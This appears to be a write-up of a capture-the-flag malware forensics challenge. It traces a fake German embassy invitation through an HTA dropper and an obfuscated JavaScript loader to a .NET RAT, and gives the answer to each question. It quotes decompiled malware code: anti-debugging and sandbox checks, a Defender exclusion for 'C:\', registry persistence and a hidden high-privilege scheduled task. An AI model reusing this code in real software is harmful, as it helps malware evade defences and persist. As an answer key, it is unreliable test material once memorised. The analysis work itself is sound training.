# **Einladen Writeup**
![image](https://github.com/user-attachments/assets/f57071d3-3b02-4330-9b55-4d4a5b5bcbdd)

Our staff recently received an invite to the German embassy to bid farewell to the Germany Ambassador. We believe this invite was a phishing email due to alerts that fired on our organization's SIEM tooling following the receipt of such mail. We have provided a wide variety of artifacts inclusive of numerous binaries, a network capture, DLLs from the host system and also a .hta file. Please analyze and complete the questions detailed below! Warning This is a warning that this Sherlock includes software that is going to interact with your computer and files. This software has been intentionally included for educational purposes and is NOT intended to be executed or used otherwise. Always handle such files in isolated, controlled, and secure environments. Once the Sherlock zip has been unzipped, you will find a DANGER.txt file. Please read this to proceed.

**Tools:**
- WireShark
- ghidra
- ProcMon
- Any.run
- Detect It Easy

**Learned:**
- Malware Forensics
- Malware Analysis
- Timeline Analysis

### **Question 1**
The victim visited a web page. The HTML file of the web page has been provided as ‘downloader.html’ sample file. The web page downloads a ZIP file named 'Invitation_Farewell_DE_EMB.zip'. What is the SHA-256 hash of the ZIP file?

Unzipping all the files we can see a an html file. I also see the 'Invitation_Farewell_DE_EMB.zip'

I will hash it using SHA-256 algorithim

![image](https://github.com/user-attachments/assets/8214f48b-7a77-4736-a7d6-ccb9ccd7e60d)

**Answer:** 5D4BF026FAD40979541EFD2419EC0B042C8CF83BC1A61CBCC069EFE0069CCD27
### **Question 2**
The downloaded ZIP file contains a HTA file, which creates multiple files. One of those files is a signed file by Microsoft Corporation. In HTA file, which variable’s value was the content of that signed file?

The msoev.exe is a MS office executable. I looked at the ''Invitation_Farewell_DE_EMB.hta' file and at I saw the variable being created and they created a script to exec it on the msoev.exe which is a normal windows file but they have altered it to be malicious

![image](https://github.com/user-attachments/assets/a7b2c9bd-5918-4314-99ae-2be2bbd71b94)

**Answer:** msoev

### **Question 3**
The threat actor was acting as an embassy of a country. Which country was that?

In the 'Invitation.pdf' file it was an invite from Germany. This file was packaged inside of the zip file. I presume the TA is acting as if they are Germany.

![image](https://github.com/user-attachments/assets/73d88f26-8081-4a7a-979c-dc54f4d6f1da)

**Answer:** Germany

### **Question 4**
The malware communicated with a chatting platform domain. What is the domain name (inclusive of sub domain) the malware connects to?

I noticed we are given a pcap file. I wonder if I can locate the domain name. I will filter on 'DNS' since this is what provides domain names. I found the fomain it is chatting with

![image](https://github.com/user-attachments/assets/daba1593-3513-443b-afd9-84fa4de912ed)

**Answer:** toyy.zulipchat.com

### **Question 5**
How many DNS A records were found for that domain?

I was able to find 6 other domains registered to toyy.zulipchat.com

![image](https://github.com/user-attachments/assets/0922d345-63a5-4346-a976-be281738600d)

**Answer:** 6

### **Question 6**
It seems like the chatting service was running on a very known cloud service using a FQDN, where the FQDN contains the IP address of the chatting domain in reversive format somehow. What is the FQDN?

I uncovered in a few logs down the cloud service provider being AWS and it is communicating to an EC2 instance. Logs are important and provide a lot of key detail. Therefore, I just kept searching for azure, google, or AWS are the known cloud providers and I found AWS.

![image](https://github.com/user-attachments/assets/9d0fc4ae-3fba-4b28-993f-989dd9115ec4)

**Answer:** ec2-35-171-197-55.compute-1.amazonaws.com

### **Question 7**
What was the parent PID (PPID) of the malware?

Using 'procMon' from the sysinternals suite of tools I know .PML files are Process Monitor Log. It is a log for processes that run on a system. I opened up properities on one of the procsses running the msoev.exe and found the P

![image](https://github.com/user-attachments/assets/ea5caa74-ad03-4eb4-8b8b-2663d5639642)

**Answer:** 4156

### **Question 8**
What was the computer name of the victim computer?

Still using ProcMon I identified the infected workstation

![image](https://github.com/user-attachments/assets/073c8c32-6113-4a60-b35e-e9105cb2633e)

**Answer:** DESKTOP-O88AN4O

### **Question 9**
What was the username of the victim computer?

You can see the username from using its hostname

![image](https://github.com/user-attachments/assets/0a7edd77-4046-41fe-a159-0d3750a98cb8)

**Answer:** TWF

### **Question 10**
How many times were the Windows Registry keys set with a data value?

I learned by my self playing with the filters that if you build this kind of filter

![image](https://github.com/user-attachments/assets/6a082a3d-e828-4f0c-b669-ee99aa4a2115)

This shows me when the registry value was set to a value. According to the results it is 11 times

![[Pasted image 20240827161800.png]]

**Answer:** 11

### **Question 11**
Did the malicious mso.dll load by the malware executable successfully?

I will look for this mso.dll in ProcMon to connect it back. I found where the mso.dll was pulled into memory confirming it was pulled in

![image](https://github.com/user-attachments/assets/6bcec72d-81cb-4830-8eac-98be3a9e3ece)

**Answer:** yes

### **Question 12**
The JavaScript file tries to write itself as a .bat file. What is the .bat file name (name+extension) it tries to write itself as?

We were provided a 'unc.js'. I will check the hash of the javascript file in VirusTotal. I see it drops a few files even a bat file which I presume is our answer but I will confirm. I still will want to statically analyze then dynamically analyze the malware. I will have to statically analyze the unc.js in an IDE like VSCode. 

I did cat the file and saw the code but it appeared packed. I know this because when I opened the javascript file in VSCode its variables are being named 'a' 'z' and there is no spacing to the code.

![image](https://github.com/user-attachments/assets/ac303a5d-d3e0-4e09-b393-15b9b3cb2820)

In the sandbox I can see what this malware actually does by doing dynamic analysis and running it in the sandbox and it will log out all the file does once executed. I ran the unc.js through any.run malware sandbox and found this command it is running through where it copies to to the bat

![image](https://github.com/user-attachments/assets/48441723-17a8-4cd2-84ce-a5409c5b2a0c)

**Answer:** richpear.bat

### **Question 13**
The JavaScript file contains a big text which is encoded as Base64. If you decode that Base64 text and write its content as an EXE file. What will be the SHA256 hash of the EXE?

I had to do some research to understand what was going on from the malware sandbox. Here is what I noticed.... it copy the cmd.exe which is actually holding wscript.exe which is just the 'unc.js'... then it copies it to a batch file. I did some research and found this is known as a polyglot malware dropper. It is designed to first infect the machine and then drop malware for various vulnerabilties on said machine.

At this point I noticed that in the unc.js its setting variables. I disabled word wrap and it is only 34 lines of code and line 28 is Base64 encoded and it appears line 34 is obfuscated javascript. But in between that I notice its calling those variables. I see the variables are assigned a letter. I suspect this to be writing a command I have a hunch the TA encoded the command through those variables. This further proves my point the code is packed as its padded by Base64 encoding and has obfuscated code behind the actual command to condense it to get evade detection

![image](https://github.com/user-attachments/assets/c506c44f-9983-4c23-835f-b728158e22d2)

After reassigning the variables with their letter we get this.

![image](https://github.com/user-attachments/assets/a7593cfe-fda4-412a-b0b8-633cda143915)

Let us break down what is going on here. First we see it is changing directories to the temp then echo anytime it sees 'adviserake'. It is using the 'findstr /v' to get any lines that don't have adviserake which would be line 28 its the Base64 encoded. Takes it and saves the Base64 encoded line to a 'jumpflame' file. Then it is using certutil for managing certificates. It will then decode it by Base64 saving it to the 'rosecomb.dll'. Lastly, you will see the dll gets pulled into the 'regsvr32' service 
	
I wonder if this is somehow related to the EmpireClient.exe it drops that I saw in VirusTotal? I am going to hash the 'EmpireClient.exe' and try the answer... that was it!!! That was the file that was dropped via the 'unc.js' file!

![image](https://github.com/user-attachments/assets/3585902d-77ba-48e6-81eb-2ee5cafffb73)

**Answer:** DB84DB8C5D76F6001D5503E8E4B16CDD3446D5535C45BBB0FCA76CFEC40F37CC

### **Question 14**
The malware contains a class Client.Settings which sets different configurations. It has a variable ‘Ports’ where the value is Base64 encoded. The value is decrypted using Aes256.Decrypt. After decryption, what will be its value (the decrypted value will be inside double quotation)?

I remmeber learning in my malware class about decompilers. I tried using strings on the 'EmpreClient.exe' but its encoded. I was able to uncover somthing named 'ports' so I saw that but I am not sure if that was a variable, setting etc.

I think using a decompiler tool to help do dynamic analysis will help here like DNSpy which will help decompile and debug .NET frameworks which I confirmed that the EmpireClient.exe is a .NET framework. I was able to look at the code of the executeable and noticed wher eit encrypts the Ports and then decrypts them. I went ahead and placed the breakpoint after and saw the data

![image](https://github.com/user-attachments/assets/5b2a1bd9-152f-4519-b755-e45c0100bea0)

**Answer:** 666,777,111,5544

### **Question 15**
The malware sends a HTTP request to a URI and checks the country code or country name of the victim machine. To which URI does the malware sends request for this?

The malicious URI is here. I continued evaluating the settings that I captured using dnSpy

![image](https://github.com/user-attachments/assets/bf080497-dcb6-4ecc-844b-e5d77af6368c)

**Answer:** http://ip-api.com/json/
### **Question 16**
After getting the country code or country name of the victim machine, the malware checks some country codes and a country name. In case of the country name, if the name is matched with the victim machine’s country name, the malware terminates itself. What is the country name it checks with the victim system?

Russia. This was al;l found within the settings. I saw a function it was using called 'GetSNG' and noticed it setting a string to a coutnry code. After further evaluation I noted the country code of 'Russia' is what it checks the system for. I will palce a snippet of the code below.

public static void GetSNG() { string countryCode = Antisng.GetCountryCode(); string countryName = Antisng.GetCountryName(); if (!(countryCode == "RU") && !(countryCode == "AZ") && !(countryCode == "AM") && !(countryCode == "BY") && !(countryCode == "KZ") && !(countryCode == "KG") && !(countryCode == "MD") && !(countryCode == "TJ") && !(countryCode == "TM") && !(countryCode == "UZ") && !(countryName == "Russia"))

**Answer:** Russia

### **Question 17**
As an anti-debugging functionality, the malware checks if there is any process running where the process name is a debugger. What is the debugger name it tries to check if that’s running?

It tried to checked for dnSpy and many other items. Cod esnippet below where I found it within the settings

public static void RunAntiAnalysis() { if (!Anti_Analysis.DetectManufacturer() && !Anti_Analysis.DetectDebugger() && !Anti_Analysis.DetectSandboxie() && !Anti_Analysis.IsSmallDisk() && !Anti_Analysis.IsXP() && **!Anti_Analysis.IsProcessRunning("dnSpy")** && !Anti_Analysis.CheckWMI()) return; Environment.FailFast((string) null); }

**Answer:** dnSpy

### **Question 18**
For persistence, the malware writes a Registry key where the registry key is hardcoded in the malware in reversed format. What is the registry key after reversing?

Under the function 'go' I found the hard coded registry key. It is in reverse format to evade detection

public static void go() { try { string str = Regex.Replace(Regex.Match(Assembly.GetExecutingAssembly().Location, "[^\\\\]+$").Value, ".exe$", ""); RegistryKey subKey = Registry.CurrentUser.CreateSubKey("Software"); if (subKey.OpenSubKey(str, true) == null) { subKey.CreateSubKey(str); Methods.create(); Methods.writeb(); Environment.Exit(0); } else { if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\" + str)) return; File.Create(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\" + str); Process.Start(new ProcessStartInfo() { FileName = "powershell", Arguments = "-Command \"Add-MpPreference -ExclusionPath 'C:\\'", Verb = "runas" }); } } catch { } }

**Answer:** HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\
### **Question 19**
The malware sets a scheduled task. What is the Run Level for the scheduled task/job it sets?

In the startup of the malware it sets a job to run at high priority. I found this under the 'Install():void' setting. I will provide the code snippet for it

Process.Start(new ProcessStartInfo() { FileName = "cmd", Arguments = **"/c schtasks /create /f /sc onlogon /rl highest /tn** \"" + Path.GetFileNameWithoutExtension(path1) + "\" /tr \"" + path1 + "\" & exit", WindowStyle = ProcessWindowStyle.Hidden, CreateNoWindow = true });

**Answer:** highest

This was the most challenging malware forensic/analysis I have done. I had to do a lot of research and pull out my notes from graduate school and even watch some videos on how to use various tools. This strengthened my ability to analyze malware on a basic level to an intermediate level. Diving deep into static analysis then running it dynamically to see what files were dropped and how. Digging into the packed code and unpacking it and understanding that its packed using a Base64 encoder wrapped by obfuscated Javascript where the Javascript we care about is in between. Personally, I learned a lot from this challenge as it challenged me in different ways of thinking on how to attack the problem forcing me to do further research on where to look
